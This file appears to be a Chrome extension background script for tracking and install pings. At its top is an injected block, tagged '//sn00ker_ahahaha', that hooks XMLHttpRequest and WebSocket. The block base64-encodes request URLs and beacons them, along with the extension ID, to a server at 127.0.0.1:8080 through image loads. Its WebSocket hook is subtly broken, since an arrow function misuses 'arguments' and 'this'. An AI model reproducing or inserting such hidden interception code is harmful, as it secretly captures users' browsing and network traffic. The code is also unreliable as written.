function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var extGlobal = {}; //jshint ignore: line

extGlobal.logManager = new LogManager();
extGlobal.constants = new Constants();
extGlobal.browserGap = new BrowserGap();
extGlobal.trackingManager = new TrackingManager();

extGlobal.browserGap.init();
chrome.runtime.setUninstallURL(extGlobal.constants.chromeUninstallURL);
activateCE();
initFirstRun();
// Alive ping
extGlobal.trackingManager.initAlivePing(extGlobal.constants.TRACKER_BROWSER_CHR);

function isFirstRunCompleted() {
    return JSON.parse(extGlobal.browserGap.localStorage.getItem("widerMailFirstRunCompleted"));
}

function initFirstRun(){
    if(!isFirstRunCompleted()) {
        var now = new Date();
        extGlobal.browserGap.localStorage.setItem("contentEnhancerFirstRunCompleted",
                                                    JSON.stringify(true));
        extGlobal.browserGap.localStorage.setItem("contentEnhancerFirstRunCompletedTime",
                                                    JSON.stringify(now.getTime()));
        sendInstallPing();
    }
}

function sendInstallPing(){
    var beaconConfig = {};
    var beaconParams = {};
    beaconParams.itype = extGlobal.constants.TRACKER_ITYPE_INSTALL;
    beaconParams.browser = extGlobal.constants.TRACKER_BROWSER_CHR;
    beaconConfig.params = beaconParams;
    extGlobal.trackingManager.sendBeacon(extGlobal.constants.TRACKER_PAGE_INFO, beaconConfig);
}

function activateCE() {
    extGlobal.browserGap.addContentScriptListener(function(msg, worker){
        if(msg.trackingManager){
            msg.beaconConfig.params.browser = extGlobal.constants.TRACKER_BROWSER_CHR;
            if(msg.pageInfo) {
                extGlobal.trackingManager.sendBeacon(extGlobal.constants.TRACKER_PAGE_INFO,
                    msg.beaconConfig);
            }
            else {
                extGlobal.trackingManager.sendBeacon(extGlobal.constants.TRACKER_CLICK_INFO,
                    msg.beaconConfig);
            }
        }
    });
}
